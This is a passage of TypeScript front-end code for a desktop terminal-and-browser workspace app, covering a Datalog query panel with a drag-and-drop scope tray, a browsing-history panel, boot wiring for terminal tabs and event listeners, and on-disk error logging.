      node("sprefa-src-empty", span("wt-meta", "builtin · emitted by the engine (no .dl rule)")),
    );
    return;
  }
  host.replaceChildren();
  for (const s of sites) {
    const rel = s.file.split("/").slice(-2).join("/");
    const row = node(
      "wt-node sprefa-site",
      span("sprefa-kind sprefa-kind-" + s.kind, s.kind),
      span("wt-label", `${rel}:${s.line}`),
    );
    row.title = s.text;
    row.addEventListener("click", (e) => {
      e.stopPropagation();
      openSprefaSource(s.file, s.line);
    });
    host.appendChild(row);
  }
}

function renderSprefaSchema(rels: SprefaRel[]) {
  const tree = document.querySelector<HTMLElement>("#sprefa-schema");
  if (!tree) return;
  tree.replaceChildren();
  // Declared relations first, built-ins (source/meta tables) after; each block
  // sorted by name.
  const sorted = [...rels].sort(
    (a, b) => Number(!!a.builtin) - Number(!!b.builtin) || a.name.localeCompare(b.name),
  );
  for (const r of sorted) {
    const glyph = span("wt-glyph", "▸");
    const row = node(
      "wt-node sprefa-rel" + (r.builtin ? " sprefa-builtin" : ""),
      glyph,
      span("wt-label", r.name),
      span("wt-meta", String(r.columns.length)),
    );
    const detail = node("sprefa-detail");
    detail.hidden = true;
    const cols = node("sprefa-cols");
    for (const c of r.columns) {
      cols.appendChild(
        node("wt-node sprefa-col", span("wt-glyph", ""), span("wt-label", c.name), span("wt-meta", c.ty)),
      );
    }
    const src = node("sprefa-src");
    detail.appendChild(span("sprefa-head", "columns"));
    detail.appendChild(cols);
    detail.appendChild(span("sprefa-head", "defined in"));
    detail.appendChild(src);
    let sourced = false;
    row.addEventListener("click", () => {
      detail.hidden = !detail.hidden;
      glyph.textContent = detail.hidden ? "▸" : "▾";
      if (!detail.hidden && !sourced) {
        sourced = true;
        loadSprefaSites(r.name, src);
      }
    });
    tree.appendChild(row);
    tree.appendChild(detail);
  }
}

async function loadSprefaSchema() {
  const status = document.querySelector<HTMLElement>("#sprefa-status");
  const tree = document.querySelector<HTMLElement>("#sprefa-schema");
  if (!tree || !status) return;
  status.textContent = "loading…";
  try {
    const res = await invoke<{ relations: SprefaRel[] }>("sprefa_schema", { root: sprefaRoot });
    renderSprefaSchema(res.relations);
    const builtins = res.relations.filter((r) => r.builtin).length;
    const declared = res.relations.length - builtins;
    status.textContent = `${res.relations.length} relations (${declared} rules, ${builtins} builtin)`;
    // The loaded .dl program: ping reports the actual file set the daemon
    // parsed. Prepend it above the relation tree so it's clear which rules are
    // in effect (multiple files merge into one program).
    try {
      const ping = await invoke<{ program: string; program_files?: string[] }>("sprefa_ping", {
        root: sprefaRoot,
      });
      const files = ping.program_files?.length ? ping.program_files : [ping.program].filter(Boolean);
      const info = node("sprefa-program");
      info.append(span("sprefa-head", `loaded program${files.length === 1 ? "" : `s (${files.length})`}`));
      if (files.length === 0) info.append(span("wt-label", "(none)"));
      for (const f of files) {
        const row = span("wt-label sprefa-program-file", f.split("/").pop() ?? f);
        row.title = f;
        // Click opens the file in the Preview pane; also a draggable file entity
        // (scope tray + right-click), like result cells and fs rows.
        row.dataset.entityKind = "file";
        row.dataset.entityValue = f;
        row.draggable = true;
        row.addEventListener("click", () => openSprefaSource(f, 0));
        info.append(row);
      }
      tree.prepend(info);
    } catch {
      /* ping optional; schema already rendered */
    }
  } catch (e) {
    tree.replaceChildren();
    status.textContent = String(e);
  }
}

type SprefaQueryResult = { rel: string; columns: string[]; rows: unknown[][] };
type SprefaDiag = { severity: string; code?: string; message: string };
type SprefaEval = { ok: boolean; results: SprefaQueryResult[]; diagnostics: SprefaDiag[] };

const SPREFA_SCRATCH_KEY = "sprefa.scratch";

function showSprefaView(view: "schema" | "scratch") {
  const schema = document.querySelector<HTMLElement>("#sprefa-schema");
  const scratch = document.querySelector<HTMLElement>("#sprefa-scratch");
  if (schema) schema.hidden = view !== "schema";
  if (scratch) scratch.hidden = view !== "scratch";
  document
    .querySelector("#sprefa-tab-schema")
    ?.classList.toggle("on", view === "schema");
  document
    .querySelector("#sprefa-tab-scratch")
    ?.classList.toggle("on", view === "scratch");
  if (view === "scratch") document.querySelector<HTMLTextAreaElement>("#sprefa-scratch-src")?.focus();
}

// Classify a result column as a common entity by its header name, falling back
// to the value shape. Returns null for plain values (names, counts, lines).
function entityKind(col: string, value: string): SprefaScopeKind | null {
  if (/^repo$/i.test(col)) return "repo";
  if (/rev/i.test(col)) return "rev";
  if (/(^|_)(path|file)$/i.test(col)) return "file";
  if (!value) return null;
  if (value === "WORK" || /^[0-9a-f]{7,40}$/i.test(value)) return "rev";
  if (value.includes("/") && /\.[a-z0-9]{1,8}$/i.test(value)) return "file";
  return null;
}

// A result/header cell. When `kind` is set the cell becomes a draggable entity
// (data-entity-* attrs shared with fs rows) and gets click-to-toggle wiring via
// the global handlers. `entity-on` marks values already in the scope tray.
function cell(text: string, tag: "td" | "th" = "td", kind: SprefaScopeKind | null = null): HTMLElement {
  const el = document.createElement(tag);
  el.textContent = text;
  if (kind && tag === "td") {
    el.dataset.entityKind = kind;
    el.dataset.entityValue = text;
    el.draggable = true;
    el.className = "entity";
    if (inScope(kind, text)) el.classList.add("entity-on");
  }
  return el;
}

// ---- sprefa scope tray --------------------------------------------------

function inScope(kind: SprefaScopeKind, value: string): boolean {
  return store.get().sprefaScope.some((s) => s.kind === kind && s.value === value);
}

function addScope(item: SprefaScopeItem) {
  if (inScope(item.kind, item.value)) return;
  store.set({ sprefaScope: [...store.get().sprefaScope, item] });
}

function removeScope(kind: SprefaScopeKind, value: string) {
  store.set({
    sprefaScope: store.get().sprefaScope.filter((s) => !(s.kind === kind && s.value === value)),
  });
}

function toggleScope(kind: SprefaScopeKind, value: string) {
  if (inScope(kind, value)) removeScope(kind, value);
  else addScope({ kind, value });
}

// Datalog facts for the active selection, prepended to a scratch query so it can
// join: e.g. `scan(R, "WORK", g, _), sel_repo(R)`. Empty when scope is off/empty.
function scopePrelude(): string {
  const { sprefaScope, sprefaScopeActive } = store.get();
  if (!sprefaScopeActive || sprefaScope.length === 0) return "";
  const rels: Record<SprefaScopeKind, { rel: string; col: string }> = {
    repo: { rel: "sel_repo", col: "repo" },
    file: { rel: "sel_file", col: "path" },
    rev: { rel: "sel_rev", col: "rev" },
  };
  const lines: string[] = [];
  for (const kind of ["repo", "file", "rev"] as SprefaScopeKind[]) {
    const vals = sprefaScope.filter((s) => s.kind === kind).map((s) => s.value);
    if (!vals.length) continue;
    const { rel, col } = rels[kind];
    lines.push(`rel ${rel}(${col}: text).`);
    for (const v of vals) lines.push(`${rel}(${JSON.stringify(v)}).`);
  }
  return lines.length ? lines.join("\n") + "\n\n" : "";
}

function renderSprefaScope() {
  const host = document.querySelector<HTMLElement>("#sprefa-scope");
  if (!host) return;
  const { sprefaScope, sprefaScopeActive } = store.get();
  host.replaceChildren();
  host.classList.toggle("active", sprefaScopeActive);

  const toggle = document.createElement("button");
  toggle.type = "button";
  toggle.className = "sprefa-scope-toggle" + (sprefaScopeActive ? " on" : "");
  toggle.title = sprefaScopeActive
    ? "scope ON — sel_repo/sel_file/sel_rev facts prepended to queries"
    : "scope OFF — selection is a collection only";
  toggle.textContent = sprefaScopeActive ? "scope ●" : "scope ○";
  toggle.onclick = () => store.set({ sprefaScopeActive: !store.get().sprefaScopeActive });
  host.appendChild(toggle);

  if (sprefaScope.length === 0) {
    host.appendChild(span("wt-meta", "drag or click files/repos/revs here"));
    return;
  }
  for (const it of sprefaScope) {
    const chip = node(`sprefa-chip kind-${it.kind}`);
    chip.append(span("sprefa-chip-kind", it.kind), span("sprefa-chip-val", it.value));
    const x = document.createElement("button");
    x.type = "button";
    x.className = "sprefa-chip-x";
    x.textContent = "×";
    x.onclick = () => removeScope(it.kind, it.value);
    chip.appendChild(x);
    host.appendChild(chip);
  }
  const clear = document.createElement("button");
  clear.type = "button";
  clear.className = "sprefa-scope-clear";
  clear.textContent = "clear";
  clear.onclick = () => store.set({ sprefaScope: [] });
  host.appendChild(clear);
}

function renderSprefaEval(res: SprefaEval) {
  const out = document.querySelector<HTMLElement>("#sprefa-scratch-out");
  if (!out) return;
  out.replaceChildren();
  const errs = res.diagnostics.filter((d) => d.severity === "error");
  for (const d of errs) {
    const row = node("sprefa-diag err");
    row.textContent = `${d.code ? `[${d.code}] ` : ""}${d.message}`;
    out.appendChild(row);
  }
  if (!res.ok) return;
  if (res.results.length === 0) {
    out.appendChild(node("sprefa-src-empty", span("wt-meta", "no ? query — add e.g. ? hot(name, line).")));
    return;
  }
  for (const q of res.results) {
    const head = node("sprefa-qhead");
    head.append(span("wt-label", `? ${q.rel}`), span("wt-meta", `${q.rows.length} rows`));
    out.appendChild(head);
    const table = document.createElement("table");
    table.className = "dtable sprefa-qtable";
    const thead = document.createElement("thead");
    const htr = document.createElement("tr");
    for (const c of q.columns) htr.appendChild(cell(c, "th"));
    thead.appendChild(htr);
    table.appendChild(thead);
    const tbody = document.createElement("tbody");
    // Classify columns once from the header + first non-empty value per column.
    const kinds = q.columns.map((c, i) => {
      const sample = q.rows.find((row) => row[i] != null);
      return entityKind(c, sample ? String(sample[i]) : "");
    });
    for (const r of q.rows.slice(0, 500)) {
      const tr = document.createElement("tr");
      r.forEach((v, i) => tr.appendChild(cell(v == null ? "" : String(v), "td", kinds[i])));
      tbody.appendChild(tr);
    }
    table.appendChild(tbody);
    out.appendChild(table);
    if (q.rows.length > 500) {
      out.appendChild(node("sprefa-src-empty", span("wt-meta", `… ${q.rows.length - 500} more rows`)));
    }
  }
}

async function runSprefaScratch() {
  const src = document.querySelector<HTMLTextAreaElement>("#sprefa-scratch-src");
  const status = document.querySelector<HTMLElement>("#sprefa-scratch-status");
  if (!src || !status) return;
  const text = src.value;
  localStorage.setItem(SPREFA_SCRATCH_KEY, text);
  status.textContent = "running…";
  try {
    const res = await invoke<SprefaEval>("sprefa_eval", {
      root: sprefaRoot,
      text: scopePrelude() + text,
    });
    renderSprefaEval(res);
    const n = res.results.reduce((a, q) => a + q.rows.length, 0);
    status.textContent = res.ok ? `${n} rows` : "errors";
  } catch (e) {
    const out = document.querySelector<HTMLElement>("#sprefa-scratch-out");
    if (out) {
      const row = node("sprefa-diag err");
      row.textContent = String(e);
      out.replaceChildren(row);
    }
    status.textContent = "failed";
  }
}

const SPREFA_DND_MIME = "application/x-sprefa-entity";

// Re-render the tray and re-mark already-rendered result cells when the scope
// changes. Cheap class toggle avoids re-running the query.
function refreshSprefaScopeUI() {
  renderSprefaScope();
  document
    .querySelectorAll<HTMLElement>("#sprefa-scratch-out [data-entity-kind]")
    .forEach((el) =>
      el.classList.toggle(
        "entity-on",
        inScope(el.dataset.entityKind as SprefaScopeKind, el.dataset.entityValue ?? ""),
      ),
    );
}

let sprefaWired = false;
function wireSprefa() {
  const input = document.querySelector<HTMLInputElement>("#sprefa-root");
  if (input) input.value = sprefaRoot;
  const scratchSrc = document.querySelector<HTMLTextAreaElement>("#sprefa-scratch-src");
  if (scratchSrc && !scratchSrc.value) scratchSrc.value = localStorage.getItem(SPREFA_SCRATCH_KEY) ?? "";
  renderSprefaScope();
  if (sprefaWired) return;
  sprefaWired = true;

  // Drag any entity (result cell or fs row) -> carry its typed value.
  document.addEventListener("dragstart", (e) => {
    const el = (e.target as HTMLElement)?.closest?.("[data-entity-kind]") as HTMLElement | null;
    if (!el || !e.dataTransfer) return;
    const item = { kind: el.dataset.entityKind, value: el.dataset.entityValue ?? "" };
    e.dataTransfer.setData(SPREFA_DND_MIME, JSON.stringify(item));
    e.dataTransfer.setData("text/plain", item.value);
    e.dataTransfer.effectAllowed = "copy";
  });

  // The tray is a drop zone for in-app entity drags.
  const tray = document.querySelector<HTMLElement>("#sprefa-scope");
  tray?.addEventListener("dragover", (e) => {
    if (!e.dataTransfer?.types.includes(SPREFA_DND_MIME)) return;
    e.preventDefault();
    e.dataTransfer.dropEffect = "copy";
    tray.classList.add("drop-hover");
  });
  tray?.addEventListener("dragleave", () => tray.classList.remove("drop-hover"));
  tray?.addEventListener("drop", (e) => {
    tray.classList.remove("drop-hover");
    const raw = e.dataTransfer?.getData(SPREFA_DND_MIME);
    if (!raw) return;
    e.preventDefault();
    try {
      const it = JSON.parse(raw) as SprefaScopeItem;
      if (it.kind && it.value) addScope(it);
    } catch {
      /* malformed payload */
    }
  });

  // Left-click an entity result cell toggles it into the selection.
  document.querySelector("#sprefa-scratch-out")?.addEventListener("click", (e) => {
    const el = (e.target as HTMLElement)?.closest?.("[data-entity-kind]") as HTMLElement | null;
    if (!el) return;
    toggleScope(el.dataset.entityKind as SprefaScopeKind, el.dataset.entityValue ?? "");
  });

  store.subscribe(() => refreshSprefaScopeUI(), ["sprefaScope", "sprefaScopeActive"]);
  const form = document.querySelector<HTMLFormElement>("#sprefa-bar");
  form?.addEventListener("submit", (e) => {
    e.preventDefault();
    if (input) {
      sprefaRoot = input.value.trim();
      localStorage.setItem(SPREFA_ROOT_KEY, sprefaRoot);
    }
    loadSprefaSchema();
  });
  document.querySelector("#sprefa-tab-schema")?.addEventListener("click", () => showSprefaView("schema"));
  document.querySelector("#sprefa-tab-scratch")?.addEventListener("click", () => showSprefaView("scratch"));
  document.querySelector("#sprefa-run")?.addEventListener("click", runSprefaScratch);
  scratchSrc?.addEventListener("keydown", (e) => {
    if ((e.metaKey || e.ctrlKey) && e.key === "Enter") {
      e.preventDefault();
      runSprefaScratch();
    }
  });
}

function registerSprefa() {
  registerPlugin({
    id: "sprefa",
    panels: [
      {
        id: "sprefa",
        title: "Sprefa",
        icon: "∿",
        iconUrl: "/icons/ComputerFind_32x32_4.png",
        iconLabel: "Sprefa",
        html: `<form id="sprefa-bar" class="wt-scan">
          <input id="sprefa-root" autocomplete="off" spellcheck="false" />
          <button type="submit">Load</button>
          <button id="sprefa-tab-schema" type="button" class="sprefa-tab on">Schema</button>
          <button id="sprefa-tab-scratch" type="button" class="sprefa-tab">Scratch</button>
          <span id="sprefa-status" class="wt-count"></span>
        </form>
        <div id="sprefa-schema" class="wt-tree"></div>
        <div id="sprefa-scratch" hidden>
          <div id="sprefa-scope" class="sprefa-scope"></div>
          <textarea id="sprefa-scratch-src" class="sprefa-scratch-src" spellcheck="false"
            placeholder="scratch datalog — runtime-only, nothing saved.&#10;&#10;rel hot(name: text, line: int).&#10;hot(name, line) &lt;-&#10;  scan(&quot;WORK&quot;, &quot;**/*.rs&quot;, p, rev),&#10;  match(p, rev, /fn\\s+(?&lt;name&gt;[a-z_]+)/, line).&#10;? hot(name, line)."></textarea>
          <div class="sprefa-scratch-bar">
            <button id="sprefa-run" type="button">Run ⌘↵</button>
            <span id="sprefa-scratch-status" class="wt-count"></span>
          </div>
          <div id="sprefa-scratch-out" class="sprefa-scratch-out"></div>
        </div>`,
        onShow: () => {
          wireSprefa();
          loadSprefaSchema();
        },
      },
    ],
  });
}

// ---- navigation plugin: browser history you can recall into a fresh tab ----
// The CDP browser tabs feed nav.ts on every URL change (global cdp-url listener
// in main()). This panel lists those visits, newest-first, filterable; clicking
// one opens it in a new browser tab. Per-tab back/forward lives in CdpView.
function registerNav() {
  registerPlugin({
    id: "nav",
    panels: [
      {
        id: "history",
        title: "History",
        icon: "↩",
        iconUrl: "/icons/Explorer100_32x32_4.png",
        iconLabel: "History",
        html: `<div class="act-bar">
          <span class="spy-title">history</span>
          <span id="nav-count" class="wt-count"></span>
          <span class="spy-spacer"></span>
          <button id="nav-clear" type="button">Clear</button>
        </div>
        <div class="wt-scan">
          <input id="nav-search" autocomplete="off" spellcheck="false" placeholder="filter history…" />
        </div>
        <div id="nav-history-body" class="panel-scroll"></div>`,
        onShow: () => renderHistoryPanel(),
      },
    ],
  });
  // Live-refresh while the panel is mounted (a visit in any tab updates the list).
  onHistoryChange(renderHistoryPanel);
}

// Split a URL into a host + path for two-line display. Falls back to the raw
// string for non-parseable entries (e.g. about:, data:).
function splitUrl(url: string): { host: string; rest: string } {
  try {
    const u = new URL(url);
    return { host: u.host || u.protocol, rest: (u.pathname + u.search).replace(/^\/$/, "") };
  } catch {
    return { host: url, rest: "" };
  }
}

function renderHistoryPanel() {
  const body = document.querySelector<HTMLElement>("#nav-history-body");
  if (!body) return; // panel detached; a later show re-renders
  const search = document.querySelector<HTMLInputElement>("#nav-search");
  const clear = document.querySelector<HTMLButtonElement>("#nav-clear");
  // Wire controls once (the html is injected once and reused across shows).
  if (search && !search.dataset.wired) {
    search.dataset.wired = "1";
    search.addEventListener("input", renderHistoryPanel);
    search.addEventListener("keydown", (e) => e.stopPropagation());
  }
  if (clear && !clear.dataset.wired) {
    clear.dataset.wired = "1";
    clear.onclick = () => clearHistory();
  }
  const q = (search?.value ?? "").trim().toLowerCase();
  const all = navHistory();
  const rows = q ? all.filter((e) => e.url.toLowerCase().includes(q)) : all;
  const count = document.querySelector<HTMLElement>("#nav-count");
  if (count) count.textContent = rows.length ? `${rows.length} page${rows.length > 1 ? "s" : ""}` : "";
  body.replaceChildren();
  if (rows.length === 0) {
    const empty = document.createElement("div");
    empty.className = "session-empty";
    empty.textContent = q ? "no matching history" : "no history yet — visit a page in a browser tab";
    body.appendChild(empty);
    return;
  }
  for (const e of rows) {
    const { host, rest } = splitUrl(e.url);
    const row = document.createElement("div");
    row.className = "nav-hist-row";
    row.title = e.url;
    row.innerHTML =
      `<div class="nav-hist-host">${escapeHtml(host)}` +
      `<span class="muted nav-hist-rest">${escapeHtml(rest)}</span></div>` +
      `<div class="muted nav-hist-time">${relTime(e.ts)}</div>`;
    row.onclick = () => openBrowserTab(e.url);
    body.appendChild(row);
  }
}

async function main() {
  // Resolve the home dir once so tildify() can stay synchronous during render.
  homeDirCached = await homeDir().catch(() => "");
  // Skin/mode are store-driven: subscribe for changes, then apply once for the
  // persisted initial state.
  store.subscribe(syncSkin, ["skin"]);
  store.subscribe(syncXpPixel, ["xpPixel"]);
  store.subscribe(syncMode, ["mode"]);
  store.subscribe(applyToolbar, ["showToolbar"]);
  store.subscribe(syncSidebar, ["sidebar"]);
  // dockview owns the layout; we only react: refit the active terminal
  // whenever dockview re-lays-out a group. Panel lazy-load is handled per-panel
  // via PanelDef.onShow in the plugin registry.
  setDockHooks({
    onTermActivate: onTermShown,
    onTermClose: onTermClosed,
    onTermLayout: fitTerm,
    onTermRetitle: (sid) => applyTabTitle(sid.slice(sessionId("").length)),
    isTermPinned: (sid) => isPinnedTab(sid.slice(sessionId("").length)),
    toggleTermPin: (sid) => togglePinTab(sid.slice(sessionId("").length)),
  });
  store.subscribe(renderWorktreesPanel, [
    "worktrees",
    "wtView",
    "wtExpanded",
    "wtFocus",
    "wtFavorites",
    "wtAgents",
  ]);
  store.subscribe(renderConfigPanel, ["config", "xpPixel", "showToolbar"]);
  syncSkin(store.get());
  syncXpPixel(store.get());
  syncMode(store.get());
  applyToolbar(store.get());
  syncSidebar(store.get());
  renderWorktreesPanel();
  // Re-apply the persisted recording flag to the backend (default off there).
  invoke("capture_set_enabled", { on: store.get().captureEnabled }).catch(
    console.error,
  );

  applyZoom(); // restore persisted webview zoom
  registerBuiltin();
  registerSprefa();
  registerNav();
  registerV2Bridges();
  registerActivityBridge();
  registerFavoritesBridge();
  refreshFavorites();
  injectPanelHtml();
  buildActivityRail();
  store.subscribe(updateFavBadge, ["aiFavs"]);
  updateFavBadge();
  // Activate anchor-positioning where it's not native (WebKit) AFTER the rail
  // exists, so the polyfill discovers the .rail-tip anchors. useAnimationFrame
  // keeps anchored elements positioned as layout/scroll changes. Gate on the
  // anchor() FUNCTION, not just the anchor-name property: WebKit may parse the
  // property while lacking positioning, which would skip the polyfill and leave
  // the tooltip stuck at the top.
  if (!CSS.supports("left: anchor(--x right)")) {
    anchorPolyfill({ useAnimationFrame: true }).catch(console.error);
  }
  wireChrome();
  wireDomCmdClick(); // ⌘-click search inside preview / rg panels (not just terminals)
  // A dock failure must not abort the rest of boot (sessions, pty listeners).
  try {
    onDockChange(syncToggles); // keep rail highlights in sync as panels open/close
    mountReactDock($("#dock")); // dockview-react renders + adopts the pooled panels
    syncToggles();
  } catch (e) {
    showError("wireDock", e);
  }
  wireWindowResize();
  wireRailResize();
  wireOsDrop().catch((e) => showError("wireOsDrop", e));
  // Capture the right-click Y (capture phase, before wireContextMenu's bubble
  // handler) so ctxItemsFor can map it to a terminal buffer row for turn-identify.
  document.addEventListener("contextmenu", (e) => (lastCtxY = e.clientY), true);
  wireContextMenu(ctxItemsFor);
  await refreshSessions();
  // Scan worktrees in the background so session rows can show which worktrees
  // they've touched; re-relate sessions once the scan lands.
  scanWorktrees().then(refreshSessions).catch(() => {});

  await listen<{ id: string; chunk: string }>("pty-data", (e) => {
    tabs.get(e.payload.id)?.term.write(e.payload.chunk);
  });

  // Kitty graphics frames resolved by the Rust proxy (graphics sessions only).
  await listen<GraphicsFrame>("pty-graphics", (e) => {
    tabs.get(e.payload.id)?.overlay?.push(e.payload);
  });

  // CDP engine failed to launch/attach a browser tab.
  await listen<{ id: string; error: string }>("cdp-error", (e) => {
    console.error("[cdp]", e.payload.error);
    flashStatus(`browser error: ${e.payload.error}`);
  });

  // Global navigation history: every browser tab's URL change (link, redirect,
  // SPA pushState) lands here regardless of which tab it came from. The per-tab
  // CdpView listens to the same event for its own address bar / back-forward.
  await listen<{ id: string; url: string }>("cdp-url", (e) => {
    recordVisit(e.payload.url);
  });

  // Reattach tabs that were open before the reload. The tmux sessions (and the
  // agents inside) are still alive in the Rust backend; `tmux new-session -A`
  // reattaches. Capture the wanted active id first — openTab() flips active as
  // it replays — then restore it once all tabs exist.
  const wantActive = store.get().active;
  replaying = true; // don't log restored tabs as fresh visits
  for (const t of store.get().openTabs) {
    if (t.browser && t.url) spawnBrowserTab(t.name, t.url);
    else openTab(t.name, { command: t.command, cwd: t.cwd, graphics: t.graphics });
  }
  replaying = false;
  if (wantActive && (tabs.has(wantActive) || browserTabs.has(wantActive))) activate(wantActive);

  // Each new activity row (browser ingest, os capture, file open) arrives here;
  // prepend, newest-first, capped.
  await listen<Event>("activity-added", (e) => {
    store.set({
      activity: [e.payload, ...store.get().activity].slice(0, ACTIVITY_CAP),
    });
  });

  // Per-gesture capture outcome (shot saved, or the reason it was skipped) —
  // drives the Activity panel's live status line + permission banner.
  await listen<CaptureStatus>("capture-status", (e) => {
    store.set({ captureStatus: e.payload });
  });

  // favorites.db mutated (add/remove) — refresh the mirror so any open panel
  // re-renders. The emitting command also returns the list, but this keeps
  // multiple windows / out-of-band edits in sync.
  await listen<Fav[]>("favorites-changed", (e) => {
    store.set({ aiFavs: e.payload });
  });

  // Frontmost-app stream (Rust polls every 400ms). Foundation for the overlay
  // state machine: stash who's in front so panels can react to focus (e.g. raise
  // / fade when VSCode comes forward). "instant" while we're focused; ignore self.
  await listen<string>("frontmost-app", (e) => {
    const app = e.payload;
    if (app && app !== "instant") store.set({ frontmostApp: app });
  });

  // Summon: replay entrance animation + refocus active terminal.
  await listen("summoned", () => {
    const app = $("#app");
    app.classList.remove("summon-in");
    void app.offsetWidth; // restart the CSS animation
    app.classList.add("summon-in");
    refreshSessions();
    // Window may reappear at a new size/position; refit so the grid (and the
    // tmux pane behind it) matches, otherwise the TUI draws clipped.
    const id = activeId();
    if (id) {
      const t = tabs.get(id);
      requestAnimationFrame(() => {
        t?.fit.fit();
        t?.term.focus();
      });
    }
  });

  // Each terminal panel refits itself via dockview's onDidDimensionsChange
  // (wired through onTermLayout -> fitTerm), so no global ResizeObserver here.

  // Esc hides the popover — unless the command palette is open, where Esc just
  // closes the palette (handled on its own input, which stops propagation).
  window.addEventListener("keydown", (e) => {
    if (e.key === "Escape" && !isPaletteOpen()) getCurrentWindow().hide();
  });

  // Central keymap: binds the command table on the window. The focused-terminal
  // path is intercepted inside attachCustomKeyEventHandler (runMatchingCommand)
  // so combos aren't typed into the pty. The rail panels (tmux, Worktrees,
  // Activity, Favorites, Config, Sprefa, …) are added as palette commands so
  // they're reachable from ⌘⇧P, not just the rail buttons. Built here because
  // plugins are registered by now.
  const panelCommands: Command[] = allPanels().map((p) => ({
    id: `panel.${p.id}`,
    keys: [],
    title: `Toggle ${p.title}`,
    group: "Panel",
    run: () => togglePanel(p.id),
  }));
  installKeymap([...TAB_COMMANDS, ...panelCommands]);

  // Overlay: re-apply on any change to its config or the frontmost app, then once
  // now so a persisted mini/fade/follow is restored on boot.
  store.subscribe(applyOverlay, [
    "overlayMode",
    "overlayTarget",
    "overlayFade",
    "miniMode",
    "frontmostApp",
  ]);
  applyOverlay();

  // Right-⌘ + Right-⇧ + V: the native tap (lib.rs) swallows the combo, copies
  // the focused app's selection, and emits the text here. Write it straight into
  // the active terminal (no picker).
  await listen<string>("send-highlight-text", (e) => {
    const id = activeId();
    const text = e.payload;
    if (!text || !text.trim()) return showError("highlight", "nothing selected to send");
    if (id) sendTextToTab(id, text + " ");
  });

  // Tray menu "Recording" item toggles capture (same path as the panel button).
  await listen("toggle-record", () => toggleRecording());

  // Tray menu "AI Integrations" master switch: off hides agents from the launch
  // pickers (shell only). Persisted via the store.
  await listen("toggle-ai", () => {
    const on = !store.get().aiEnabled;
    store.set({ aiEnabled: on });
    flashStatus(`AI integrations ${on ? "on" : "off"}`);
  });

  // Click-outside dismiss: hide when the window loses focus. Gated on a prior
  // focus so it doesn't self-hide at launch, and suppressed during screenshot.
  const win = getCurrentWindow();
  let everFocused = false;
  await win.onFocusChanged(({ payload: focused }) => {
    if (focused) {
      everFocused = true;
      cancelHide();
      return;
    }
    if (everFocused && !capturing && !draggingIn) {
      // Defer so a drag-in (which blurs us) can land; a drag-enter cancels it.
      // Kept short so tab-away/click-out dismiss feels instant.
      cancelHide();
      hideTimer = window.setTimeout(() => win.hide(), 120);
    }
  });
}

// Append a line to the on-disk log (app_data_dir/instant.log). The webview
// console isn't reachable once the app is bundled, so this is the durable record.
// Best-effort and fire-and-forget; never throws back into a caller.
export function logLine(line: string): void {
  let stamp = "";
  try {
    stamp = new Date().toISOString();
  } catch {
    /* ignore */
  }
  invoke("log_append", { line: `${stamp} ${line}` }).catch(() => {});
}

// Surface any boot/runtime error as a visible banner — the webview console
// isn't reachable from the terminal, so this is how errors get seen.
function showError(label: string, err: unknown) {
  const msg = err instanceof Error ? `${err.message}\n${err.stack ?? ""}` : String(err);
  logLine(`[${label}] ${msg}`);
  let el = document.getElementById("boot-error");
  if (!el) {
    el = document.createElement("pre");
    el.id = "boot-error";
    el.style.cssText =
      "position:fixed;left:8px;right:8px;bottom:8px;z-index:99999;max-height:40%;overflow:auto;margin:0;padding:8px;background:#a00;color:#fff;font:11px/1.4 Menlo,monospace;white-space:pre-wrap;border:2px solid #fff;";
    document.body.appendChild(el);
  }
  el.textContent = `[${label}] ${msg}`;
  console.error(label, err);
}
// Mirror console.error to the on-disk log. Most invoke failures use
// `.catch(console.error)` (open_session, list_sessions, addPanel, …) and never
// reach showError, so without this they're invisible in a bundled build — which
// is exactly how a recoverable tmux/dock error reads as "jammed, no diagnostics".
{
  const orig = console.error.bind(console);
  const fmt = (a: unknown): string => {
    if (a instanceof Error) return `${a.message}\n${a.stack ?? ""}`;
    if (typeof a === "string") return a;
    try {
      return JSON.stringify(a);
    } catch {
      return String(a);
    }
  };
  console.error = (...args: unknown[]) => {
    orig(...args);
    try {
      logLine("[console.error] " + args.map(fmt).join(" "));
    } catch {
      /* ignore */
    }
  };
}

window.addEventListener("error", (e) => showError("error", e.error ?? e.message));
window.addEventListener("unhandledrejection", (e) => showError("promise", e.reason));

main().catch((e) => showError("main", e));
